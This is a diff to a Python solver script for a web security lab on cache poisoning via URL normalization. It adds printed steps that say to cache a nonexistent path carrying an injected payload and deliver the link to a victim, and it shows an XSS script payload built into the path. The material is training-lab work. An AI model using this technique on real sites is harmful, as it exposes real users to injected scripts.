@@ -5,6 +5,9 @@ from colorama import Fore
 LAB_NAME = "Web cache poisoning via URL normalization"
 
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Send multiple request to a non-exist path to cache it with the injected payload\n2. Deliver the link to the victim\n""")
+
     url = url.rstrip('/')
     non_exist = "mystic_mido"
     injected_path = f"/{non_exist}</p><script>alert(1)</script><p>"
